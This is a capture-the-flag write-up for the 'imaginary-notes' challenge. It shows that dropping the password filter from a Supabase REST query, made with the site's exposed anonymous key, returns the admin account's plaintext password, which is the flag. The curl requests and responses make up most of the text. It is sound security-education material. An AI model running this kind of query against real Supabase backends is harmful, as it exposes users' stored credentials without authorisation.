# imaginary-notes

```
by cleverbear57
Description

I made a new note taking app using Supabase! Its so secure, I put my flag as the password to the "admin" account. I even put my anonymous key somewhere in the site. The password database is called, "users". http://imaginary-notes.chal.imaginaryctf.org
```

Visit the website, and login to admin using `admin`, a HTTP request is sent:

```shell
$ curl 'https://dpyxnwiuwzahkxuxrojp.supabase.co/rest/v1/users?select=*&username=eq.admin&password=eq.admin' \
  --compressed \
  -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:142.0) Gecko/20100101 Firefox/142.0' \
  -H 'Accept: application/vnd.pgrst.object+json' \
  -H 'Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3' \
  -H 'Accept-Encoding: gzip, deflate, br, zstd' \
  -H 'Referer: http://imaginary-notes.chal.imaginaryctf.org/' \
  -H 'accept-profile: public' \
  -H 'apikey: REDACTED' \
  -H 'authorization: Bearer REDACTED' \
  -H 'x-client-info: supabase-js-web/2.50.3' \
  -H 'Origin: http://imaginary-notes.chal.imaginaryctf.org' \
  -H 'Sec-GPC: 1' \
  -H 'Connection: keep-alive' \
  -H 'Sec-Fetch-Dest: empty' \
  -H 'Sec-Fetch-Mode: cors' \
  -H 'Sec-Fetch-Site: cross-site' \
  -H 'Priority: u=0' \
  -H 'TE: trailers'
{"code":"PGRST116","details":"The result contains 0 rows","hint":null,"message":"Cannot coerce the result to a single JSON object"}
```

If we skip the query for `password`:

```shell
$ curl 'https://dpyxnwiuwzahkxuxrojp.supabase.co/rest/v1/users?select=*&username=eq.admin' \
  --compressed \
  -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:142.0) Gecko/20100101 Firefox/142.0' \
  -H 'Accept: application/vnd.pgrst.object+json' \
  -H 'Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3' \
  -H 'Accept-Encoding: gzip, deflate, br, zstd' \
  -H 'Referer: http://imaginary-notes.chal.imaginaryctf.org/' \
  -H 'accept-profile: public' \
  -H 'apikey: REDACTED' \
  -H 'authorization: Bearer REDACTED' \
  -H 'x-client-info: supabase-js-web/2.50.3' \
  -H 'Origin: http://imaginary-notes.chal.imaginaryctf.org' \
  -H 'Sec-GPC: 1' \
  -H 'Connection: keep-alive' \
  -H 'Sec-Fetch-Dest: empty' \
  -H 'Sec-Fetch-Mode: cors' \
  -H 'Sec-Fetch-Site: cross-site' \
  -H 'Priority: u=0' \
  -H 'TE: trailers'
{"id":"5df6d541-c05e-4630-a862-8c23ec2b5fa9","username":"admin","password":"ictf{why_d1d_1_g1v3_u_my_@p1_k3y???}"}⏎
```

The flag is found.
